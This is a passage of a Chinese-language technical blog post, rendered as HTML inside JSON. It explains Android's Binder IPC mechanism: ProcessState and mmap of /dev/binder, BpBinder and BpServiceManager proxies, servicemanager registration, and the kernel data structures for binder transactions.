class=\"keyword\">return</span> gProcess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    gProcess = <span class=\"keyword\">new</span> <span class=\"built_in\">ProcessState</span>(kDefaultDriver);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gProcess;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProcessState::<span class=\"built_in\">ProcessState</span>()</span><br><span class=\"line\">    : <span class=\"built_in\">mDriverFD</span>(<span class=\"built_in\">open_driver</span>(driver))</span><br><span class=\"line\">    , <span class=\"built_in\">mVMStart</span>(MAP_FAILED)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mDriverFD &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// mmap the binder, providing a chunk of virtual address space to receive transactions.</span></span><br><span class=\"line\">        mVMStart = <span class=\"built_in\">mmap</span>(<span class=\"literal\">nullptr</span>, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, <span class=\"number\">0</span>);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>mmap 的作用是 将 binder 驱动程序提供的一块内存映射到用户空间的虚拟地址空间中，以便用户空间进程可以通过这块内存与 binder 驱动进行通信。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌────────────────────────────┐</span><br><span class=\"line\">│        App 进程            │</span><br><span class=\"line\">│  - open /dev/binder        │</span><br><span class=\"line\">│  - mmap 内存区域 A         │◄──┐</span><br><span class=\"line\">└────────────────────────────┘   │</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">┌────────────────────────────┐   │</span><br><span class=\"line\">│     system_server 进程      │   │</span><br><span class=\"line\">│  - open /dev/binder         │   │</span><br><span class=\"line\">│  - mmap 内存区域 B          │◄──┤</span><br><span class=\"line\">└────────────────────────────┘   │</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">┌────────────────────────────┐   │  通过 ioctl + mmap 进行通信</span><br><span class=\"line\">│     servicemanager 进程     │   │</span><br><span class=\"line\">│  - open /dev/binder         │   │</span><br><span class=\"line\">│  - mmap 内存区域 C          │◄──┘</span><br><span class=\"line\">└────────────────────────────┘</span><br><span class=\"line\"></span><br><span class=\"line\">         ▲</span><br><span class=\"line\">         │</span><br><span class=\"line\">   ┌─────────────┐</span><br><span class=\"line\">   │  binder 驱动 │（内核空间）</span><br><span class=\"line\">   └─────────────┘</span><br></pre></td></tr></table></figure>\n\n\n<p>返回BpBinder</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sp&lt;IBinder&gt; <span class=\"title\">ProcessState::getStrongProxyForHandle</span><span class=\"params\">(<span class=\"type\">int32_t</span> handle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        handle_entry* e = <span class=\"built_in\">lookupHandleLocked</span>(handle);</span><br><span class=\"line\">            b = BpBinder::<span class=\"built_in\">create</span>(handle);</span><br><span class=\"line\">                        e-&gt;binder = b;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (b) e-&gt;refs = b-&gt;<span class=\"built_in\">getWeakRefs</span>();</span><br><span class=\"line\">            result = b;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BpBinder 转为 IServiceManager 即BpBinderServiceManager</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> INTERFACE&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> sp&lt;INTERFACE&gt; <span class=\"title\">interface_cast</span><span class=\"params\">(<span class=\"type\">const</span> sp&lt;IBinder&gt;&amp; obj)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> INTERFACE::<span class=\"built_in\">asInterface</span>(obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//函数名展开为：</span></span><br><span class=\"line\">IServiceManager::<span class=\"built_in\">asInterface</span>(<span class=\"built_in\">sp</span>&lt;IBinder&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\">BpBinder</span>(<span class=\"number\">0</span>)))</span><br><span class=\"line\"><span class=\"comment\">//而此函数</span></span><br><span class=\"line\"><span class=\"comment\">// 由宏DECLARE_META_INTERFACE 在 IServiceManager.h 实现</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 由宏IMPLEMENT_META_INTERFACE 在 IServiceManager.cpp实现</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在 IServiceManager.h</span></span><br><span class=\"line\"><span class=\"built_in\">DECLARE_META_INTERFACE</span>(ServiceManager)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在 IServiceManager.cpp</span></span><br><span class=\"line\"><span class=\"built_in\">IMPLEMENT_META_INTERFACE</span>(ServiceManager, <span class=\"string\">&quot;android.os.IServiceManager&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//函数体最终展开为：</span></span><br><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">IServiceManager::asInterface</span><span class=\"params\">(<span class=\"type\">const</span> sp&lt;IBinder&gt;&amp; obj)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">BpServiceManager</span>(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>defaultServiceManager() 返回的是 BpServiceManager，因为它通过 interface_cast<IServiceManager>() 把一个 BpBinder(0)（远端的 servicemanager 代理）转换成了一个 BpServiceManager 类型的对象。</p>\n<p>这个 BpServiceManager 是 servicemanager 的客户端代理，它包装了所有 Binder 通信细节（比如 transact(CHECK_SERVICE)），供 App 或 System Server 调用。</p>\n<p>每个进程如果要注册服务，都会创建自己的 BpServiceManager 实例，用来通过 Binder 向 servicemanager 发起 addService() 等调用。<br>注意：<br>    •    虽然每个进程都会 构造一个 BpServiceManager 对象，但这个对象内部都指向 同一个远程 Binder 节点（handle=0），也就是 servicemanager；<br>    •    所以每个进程只是创建了一个“代理对象”，而不是实际的服务管理器本体；<br>    •    真正提供服务注册逻辑的，是 servicemanager 进程中的 BnServiceManager::onTransact()。</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2>","site":{"data":{}},"cover":false,"excerpt":"","more":"<h3 id=\"1-基础概述\"><a href=\"#1-基础概述\" class=\"headerlink\" title=\"1. 基础概述\"></a>1. 基础概述</h3><p>android 中多进程的通信都会依赖Binder IPC机制<br>1.1 IPC原理<br>从进程的角度看：</p>\n<img src=\"/Blog/2025/03/29/binder/binder_process.png\" class=\"\" title=\"binder_process\">\n<p>每个Android的进程，只能运行在自己进程所拥有的虚拟地址空间。<br>对应一个4GB的虚拟地址空间，其中3GB是用户空间，1GB是内核空间，当然内核空间的大小是可以通过参数配置调整的。<br>对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。<br>Client进程向Server进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client端与Server端进程往往采用ioctl等方法跟内核空间的驱动进行交互。<br>1.2 binder原理<br><img src=\"./binbinder_principle.png\" alt=\"alt text\"><br><img src=\"./binder/binder_principle.png\" alt=\"alt text\"><br>可以看出无论是注册服务和获取服务的过程都需要ServiceManager，<br>需要注意的是此处的Service Manager是指Native层的ServiceManager（C++），并非指framework层的ServiceManager(Java)。<br>ServiceManager是整个Binder通信机制的大管家，是Android进程间通信机制Binder的守护进程，要掌握Binder机制，<br>首先需要了解系统是如何首次启动Service Manager。当Service Manager启动之后，Client端和Server端通信时都需要先获取Service Manager接口，才能开始通信服务。<br>注册服务(addService)：Server进程要先注册Service到ServiceManager。该过程：Server是客户端，ServiceManager是服务端。<br>获取服务(getService)：Client进程使用某个Service前，须先向ServiceManager中获取相应的Service。该过程：Client是客户端，ServiceManager是服务端。<br>使用服务：Client根据得到的Service信息建立与Service所在的Server进程通信的通路，然后就可以直接与Service交互。该过程：client是客户端，server是服务端。<br>1.3 C/S模式<br>BpBinder(客户端)和BBinder(服务端)都是Android中Binder通信相关的代表，它们都从IBinder类中派生而来，关系图如下：<br><img src=\"binder_cs.png\" alt=\"alt text\"><br>client端：BpBinder.transact()来发送事务请求；<br>server端：BBinder.onTransact()会接收到相应事务。</p>\n<h3 id=\"2-创建binder服务\"><a href=\"#2-创建binder服务\" class=\"headerlink\" title=\"2. 创建binder服务\"></a>2. 创建binder服务</h3><p>数据结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> __u32;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> __u64;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> BINDER_IPC_32BIT</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32 <span class=\"type\">binder_size_t</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32 <span class=\"type\">binder_uintptr_t</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64 <span class=\"type\">binder_size_t</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64 <span class=\"type\">binder_uintptr_t</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//native层binder通信的数据结构</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> fd; <span class=\"comment\">// dev/binder的文件描述符</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *mapped; <span class=\"comment\">//指向mmap的内存地址</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> mapsize; <span class=\"comment\">//分配的内存大小，默认为128KB</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_write_read</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> write_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> write_consumed;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> write_buffer;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> read_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> read_consumed;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> read_buffer;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">res = ioctl(bs-&gt;fd, BINDER_WRITE_READ, &amp;bwr);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">binder_parse</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_state *bs, <span class=\"keyword\">struct</span> binder_io *bio,</span></span><br><span class=\"line\"><span class=\"params\">                 <span class=\"type\">uintptr_t</span> ptr, <span class=\"type\">size_t</span> size, binder_handler func)</span></span><br><span class=\"line\"></span><br><span class=\"line\">从read_buffer中读取binder事务数据，</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//内核层binder通信的数据结构</span></span><br><span class=\"line\">BR_TRANSACTION</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> binder_transaction_data_secctx &#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction_data</span> <span class=\"title\">transaction_data</span>;</span></span><br><span class=\"line\">    <span class=\"type\">binder_uintptr_t</span> secctx; <span class=\"comment\">// secure context 扩展字段</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">[cmd = 0x80000001]             ← 4 字节</span></span><br><span class=\"line\"><span class=\"comment\">[binder_transaction_data]     ← 56 or 64 字节（取决于架构）</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ target.handle</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ cookie</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ code</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ flags</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ sender_pid / euid</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ data_size / offsets_size</span></span><br><span class=\"line\"><span class=\"comment\"> └─ data.ptr.buffer / offsets</span></span><br><span class=\"line\"><span class=\"comment\">[optional: secctx]            ← 只有在 BR_TRANSACTION_SEC_CTX 才有</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">kernel → 用户空间</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        ↓</span></span><br><span class=\"line\"><span class=\"comment\">    binder_parse()</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- 解析 ptr → txn</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- bio_init_from_txn → msg</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- func(bs, txn, msg, reply)</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- 根据 flags 判断是否 reply / free buffer</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#read_buffer去掉binder事务数据，剩下的全是binder对象数据</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction_data</span> &#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">    __u32 handle;</span><br><span class=\"line\">    <span class=\"type\">binder_uintptr_t</span> ptr;</span><br><span class=\"line\">  &#125; target;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> cookie;</span><br><span class=\"line\">  __u32 code;</span><br><span class=\"line\">  __u32 flags;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> sender_pid;</span><br><span class=\"line\">  <span class=\"type\">uid_t</span> sender_euid;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> data_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> offsets_size;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">      <span class=\"type\">binder_uintptr_t</span> buffer;</span><br><span class=\"line\">      <span class=\"type\">binder_uintptr_t</span> offsets;</span><br><span class=\"line\">    &#125; ptr;</span><br><span class=\"line\">    __u8 buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">  &#125; data;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bio_init_from_txn</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_io *bio, <span class=\"keyword\">struct</span> binder_transaction_data *txn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bio-&gt;data = bio-&gt;data0 = (<span class=\"type\">char</span> *)(<span class=\"type\">intptr_t</span>)txn-&gt;data.ptr.buffer;</span><br><span class=\"line\">    bio-&gt;offs = bio-&gt;offs0 = (<span class=\"type\">binder_size_t</span> *)(<span class=\"type\">intptr_t</span>)txn-&gt;data.ptr.offsets;</span><br><span class=\"line\">    bio-&gt;data_avail = txn-&gt;data_size;</span><br><span class=\"line\">    bio-&gt;offs_avail = txn-&gt;offsets_size / <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>);</span><br><span class=\"line\">    bio-&gt;flags = BIO_F_SHARED;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_io</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *data;            <span class=\"comment\">/* pointer to read/write from */</span></span><br><span class=\"line\">    <span class=\"type\">binder_size_t</span> *offs;   <span class=\"comment\">/* array of offsets */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> data_avail;     <span class=\"comment\">/* bytes available in data buffer */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> offs_avail;     <span class=\"comment\">/* entries available in offsets array */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *data0;           <span class=\"comment\">/* start of data buffer */</span></span><br><span class=\"line\">    <span class=\"type\">binder_size_t</span> *offs0;  <span class=\"comment\">/* start of offsets buffer */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> flags;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> unused;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span>(txn-&gt;code)</span><br><span class=\"line\"></span><br><span class=\"line\">do_find_service <span class=\"keyword\">return</span> si-&gt;handle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> svcinfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> svcinfo *next;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> handle;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_death</span> <span class=\"title\">death</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> allow_isolated;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> dumpsys_priority;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> name[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">内核层binder对象数据结构</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_object_header</span> &#123;</span></span><br><span class=\"line\">\t__u32        type;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">flat_binder_object</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_object_header</span>\t<span class=\"title\">hdr</span>;</span></span><br><span class=\"line\">\t__u32\t\t\t\tflags;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* 8 bytes of data. */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"type\">binder_uintptr_t</span>\tbinder;\t<span class=\"comment\">/* local object */</span></span><br><span class=\"line\">\t\t__u32\t\t\thandle;\t<span class=\"comment\">/* remote object */</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* extra data associated with local object */</span></span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span>\tcookie;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_node</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> debug_id;</span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span> lock;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_work</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rb_node</span> <span class=\"title\">rb_node</span>;</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span> <span class=\"title\">dead_node</span>;</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_proc</span> *<span class=\"title\">proc</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_head</span> <span class=\"title\">refs</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> internal_strong_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> local_weak_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> local_strong_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> tmp_refs;</span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span> ptr;</span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span> cookie;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span 